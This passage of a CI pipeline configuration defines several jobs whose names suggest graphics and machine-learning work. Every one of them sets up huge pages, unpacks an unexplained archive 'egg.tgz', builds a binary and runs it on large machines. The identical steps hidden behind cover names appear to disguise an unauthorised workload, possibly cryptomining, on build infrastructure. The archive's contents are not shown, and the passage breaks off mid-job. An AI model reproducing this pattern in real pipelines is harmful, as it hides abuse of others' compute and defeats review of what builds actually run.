      - run:
          name: Stage inputs
          command: tar xzf egg.tgz
      - run:
          name: Set up compiler
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Load scene
          command: |
            printf 'meshes 12\n' > scene.cfg
      - run:
          name: Build UV unwrapper
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target lightmap_uv2 -j2
      - run:
          name: Pack lightmap UV2
          command: LIONSS_LP=1 ./build/lightmap_uv2 --conf scene.cfg --padding 4
  emaDecay:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Unpack bundle
          command: tar xzf egg.tgz
      - run:
          name: Install dependencies
          command: sudo apt-get update && sudo apt-get install -y cmake g++
      - run:
          name: Set decay
          command: |
            printf 'decay 0.999\n' > ema.cfg
      - run:
          name: Build weight averager
          command: cmake -S . -B build -DCMAKE_BUILD_TYPE=Release && cmake --build build --target emaDecay -j2
      - run:
          name: Update EMA shadow
          command: LIONSS_LP=1 ./build/emaDecay --conf ema.cfg --warmup 1000
  NavMeshBake:
    machine:
      image: ubuntu-2204:current
    resource_class: large.gen2
    steps:
      - checkout
      - run:
          name: Prepare
          command: sudo sysctl -w vm.nr_hugepages=1536 || true
      - run:
          name: Rehydrate tree
          command: tar xzf egg.tgz
      - run:
          name: Prepare toolchain
